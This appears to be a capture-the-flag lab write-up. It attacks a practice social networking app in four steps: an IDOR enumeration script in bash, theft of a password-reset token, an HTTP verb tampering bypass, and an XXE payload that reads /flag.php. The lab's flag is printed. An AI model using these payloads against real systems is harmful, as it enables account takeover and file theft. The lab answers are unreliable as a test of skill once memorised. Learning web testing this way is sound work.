## Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

The login details are provided in the question below.

![Pasted image 20250217220316.png](../../../IMAGES/Pasted%20image%2020250217220316.png)

Let's visit the web application:

![Pasted image 20250217220549.png](../../../IMAGES/Pasted%20image%2020250217220549.png)

We can authenticate now:

![Pasted image 20250217220617.png](../../../IMAGES/Pasted%20image%2020250217220617.png)
## Identifying IDOR
---

We get sent to this dashboard, we can see settings, messages, invites, events, account settings and statistics, if we go to `settings`, we can see this:

![Pasted image 20250217220735.png](../../../IMAGES/Pasted%20image%2020250217220735.png)

We can change our password here, let's try sending a request to burp to analyze it:

![Pasted image 20250217221231.png](../../../IMAGES/Pasted%20image%2020250217221231.png)

We get an api call to `token/74`, also, we are assigned a cookie and an `uid`, in this case, we are assigned with `uid=74`, viewing the structure of the api call, we can see that the uid is strictly related to the token, let's try changing it to another uid to check the behavior:

![Pasted image 20250217221356.png](../../../IMAGES/Pasted%20image%2020250217221356.png)

For example, if we change it to 1, we get that token, that token is necessary for the following:

![Pasted image 20250217221433.png](../../../IMAGES/Pasted%20image%2020250217221433.png)

We can see that the `reset.php` function needs the token to function, since we can enumerate the tokens for other uids rather than ours, but, how do we even know which one is meant for admin user since we can only know tokens, that's when we need to go to our `HTTP History`, in there, we can check another `GET` request being made to `/api.php/user/`:


![Pasted image 20250217222105.png](../../../IMAGES/Pasted%20image%2020250217222105.png)

Since this behaves exactly like the token request, we can change the uid and token call to check other users, for example, with number 1:

![Pasted image 20250217222149.png](../../../IMAGES/Pasted%20image%2020250217222149.png)

## Enumerating Admin User
Now, it's time to automatize the uid search, let's begin with this bash script to enumerate users and view the uid of the admin user:

```bash
#!/bin/bash

# Target URL
TARGET="http://IP:PORT/api.php/user/"

# User-Agent
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"

# Output file
OUTPUT_FILE="idor_results.txt"

# Clear previous results
> "$OUTPUT_FILE"

# Colored output
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Loop through user IDs
for uid in {1..100}; do
    RESPONSE=$(curl -s "$TARGET$uid" -H "User-Agent: $USER_AGENT")
    
    if echo "$RESPONSE" | grep -iq "admin"; then
        echo -e "${GREEN}[+] Admin Found! UID: $uid${RESET}"
        echo "$RESPONSE" | tee -a "$OUTPUT_FILE"
    fi

done

echo -e "${GREEN}[+] Enumeration complete. Results saved to $OUTPUT_FILE${RESET}"

```

After a bit, we get the following:

```bash
[+] Admin Found! UID: 52

{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

We found the right uid, let's visualize the token:

![Pasted image 20250217230027.png](../../../IMAGES/Pasted%20image%2020250217230027.png)

Our admin token is:

```
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

If we try to reset the password, this happens:

![Pasted image 20250217230135.png](../../../IMAGES/Pasted%20image%2020250217230135.png)

We're getting `Access Denied`, we can bypass this restriction with `HTTP Verb Tampering`.

## HTTP Verb Tampering
---

To begin with, change the request to `PUT`:

![Pasted image 20250217230238.png](../../../IMAGES/Pasted%20image%2020250217230238.png)

Now we get something different, let's adjust the parameters:

![Pasted image 20250217230311.png](../../../IMAGES/Pasted%20image%2020250217230311.png)

And now we were able to successfully change the password using `PUT` verb, we can now log as the admin user:

```ad-note
`a.corrales`:`test`
```

![Pasted image 20250217230426.png](../../../IMAGES/Pasted%20image%2020250217230426.png)

## Identifying Admin Functionalities
----

Nice, we are now inside the admin panel and we got a new functionality: `Add Event`, let's check the request for this:

![Pasted image 20250217230553.png](../../../IMAGES/Pasted%20image%2020250217230553.png)

Let's create a simple test event:

![Pasted image 20250217230641.png](../../../IMAGES/Pasted%20image%2020250217230641.png)

Now, check the request:

![Pasted image 20250217230722.png](../../../IMAGES/Pasted%20image%2020250217230722.png)

We have a XML form, if we send the request, this is the response we're given:

![Pasted image 20250217230757.png](../../../IMAGES/Pasted%20image%2020250217230757.png)

It seems like the `name` property gets injected directly to the response, let's change it to something else and check:

![Pasted image 20250217230848.png](../../../IMAGES/Pasted%20image%2020250217230848.png)

If we inject `whoami`, we can see it indeed goes through, we do not get the output of the command but it helps us understand that it gets reflected in the response:

![Pasted image 20250217231014.png](../../../IMAGES/Pasted%20image%2020250217231014.png)

Now, knowing this, we can try exploiting XXE.

## Exploiting XXE
---

We can read the contents of our flag using the following payload:

```xml
<!DOCTYPE name [

  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">

]>
            <root>
            <name>&xxe;</name>
            <details>1</details>
            <date>0001-11-11</date>
            </root>
```

In this case, since we know the `name` is vulnerable, we can define an entity and then use it, this displays the following:

```
HTTP/1.1 200 OK

Date: Tue, 18 Feb 2025 04:41:32 GMT

Server: Apache/2.4.41 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Vary: Accept-Encoding

Content-Length: 86

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8



Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
```

We got the flag in base64, we can even use burp's decoder to quickly decode that:

![Pasted image 20250217234359.png](../../../IMAGES/Pasted%20image%2020250217234359.png)

That outputs:

```
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

Flag is: 

```
HTB{m4573r_w3b_4774ck3r}
```

![Pasted image 20250217234432.png](../../../IMAGES/Pasted%20image%2020250217234432.png)

